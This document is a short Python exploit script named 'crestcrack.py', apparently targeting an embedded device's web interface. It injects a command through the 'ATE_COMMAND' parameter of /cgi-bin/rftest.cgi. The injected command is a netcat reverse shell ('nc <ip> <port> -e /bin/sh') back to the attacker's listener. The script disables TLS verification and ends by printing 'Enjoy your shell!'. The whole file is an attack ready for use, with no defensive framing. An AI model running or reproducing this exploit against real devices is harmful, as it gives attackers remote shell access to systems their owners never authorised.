#!/usr/bin/env python2


#crestcrack.py
#Usage: ./crestcrack.py <targer url> <listener ip> <listener port>
#Example: ./crestcrack.py https://0.0.0.0 256.256.256.256 1337

import urllib.request, urllib.error, urllib.parse
import urllib.request, urllib.parse, urllib.error
import sys
import ssl


if __name__ == '__main__':
	if len(sys.argv) == 1: #basic help print
		print("crestcrack.py")
		print("Usage: ./crestcrack.py <targer url> <listener ip> <listener port>")
		print("Example: ./crestcrack.py https://0.0.0.0 256.256.256.256 1337")
		sys.exit()


	targeturl = sys.argv[1]
	shellip = sys.argv[2]
	shellport = sys.argv[3]



	payload = '/usr/bin/nc %s %s -e /bin/sh' % (shellip, shellport) #Utilize netcat to create a reverse shell connection to you

	url = '%s/cgi-bin/rftest.cgi?lang=en&src=AwServicesSetup.html' % (targeturl)

	data = urllib.parse.urlencode({
		'ATE_COMMAND' : payload,
		'ATECHANNEL'  : '',
		'ATETXLEN' : '24',
		'ATETXCNT'  : '',
		'ATETXMODE' : '',
		'ATETXBW'  : '',
		'ATETXGI' : '',
		'ATETXMCS'  : '',
		'ATETXANT' : '',
		'ATERXANT'  : '',
		'ATERXFER' : '',
		'ResetCounter'  : '',
		'ATEAUTOALC'  : '',
		'ATEIPG'  : '',
		'ATEPAYLOAD'  : '',
		'ATE'  : '',
		'TXCONT'  : '',

		})


	sslfix = ssl.create_default_context() #Ignore cert issues that result from using an IP rather than hostname
	sslfix.check_hostname = False
	sslfix.verify_mode = ssl.CERT_NONE

	req = urllib.request.Request(url, data)
	response = urllib.request.urlopen(req, context=sslfix)


	print('Enjoy your shell!')
